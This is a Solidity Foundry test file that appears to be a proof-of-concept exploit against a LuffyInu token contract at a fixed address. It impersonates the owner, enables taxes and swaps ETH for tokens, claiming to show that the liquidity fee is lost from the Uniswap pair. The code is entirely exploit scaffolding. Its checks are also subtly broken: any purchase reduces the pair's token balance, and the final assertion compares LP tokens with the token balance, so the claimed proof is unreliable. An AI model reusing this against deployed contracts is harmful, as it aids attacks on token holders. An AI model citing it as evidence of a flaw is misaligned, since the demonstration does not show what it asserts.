// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ILuffyInu {
    function setTax(bool enable) external;
    function addExcludeFee(address b, bool enable) external;
    function excludeFee(address) external view returns (bool);
    function uniswapV2Pair() external view returns (address);
    function uniswapV2Router() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function owner() external view returns (address);
}

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x720f6edD18f5e2F414DBa8fCD81E98724708c39E;
    address attacker = address(this);
    ILuffyInu luffy;
    IUniswapV2Router02 router;
    address pair;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        luffy = ILuffyInu(TARGET);
        router = IUniswapV2Router02(luffy.uniswapV2Router());
        pair = luffy.uniswapV2Pair();

        vm.label(TARGET, "LuffyInu");
        vm.label(address(router), "Uniswap Router");
        vm.label(pair, "Uniswap Pair");
        vm.label(attacker, "Attacker");

        deal(attacker, 10 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Enable taxes as owner
        address owner = luffy.owner();
        vm.startPrank(owner);
        luffy.setTax(true);
        luffy.addExcludeFee(attacker, false);
        vm.stopPrank();

        // Verify attacker is not excluded
        require(!luffy.excludeFee(attacker), "Attacker should not be excluded");

        // Record pair's token balance before buy
        uint256 pairBalanceBefore = IERC20(TARGET).balanceOf(pair);

        // Build swap path: WETH -> LuffyInu
        address[] memory path = new address[](2);
        path[0] = router.WETH();
        path[1] = TARGET;

        // Swap ETH for tokens (this triggers the buy with fees)
        uint256 swapAmount = 1 ether;
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{
            value: swapAmount
        }(0, path, attacker, block.timestamp + 3600);

        // Record pair's token balance after buy
        uint256 pairBalanceAfter = IERC20(TARGET).balanceOf(pair);

        // The liquidity fee (1%) was lost - pair balance should be less
        // This demonstrates the vulnerability: liquidity fee tokens are not added to pair
        assertLt(pairBalanceAfter, pairBalanceBefore, "Liquidity fee tokens were lost from pair");
        assertEq(IERC20(pair).balanceOf(pair), pairBalanceBefore, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

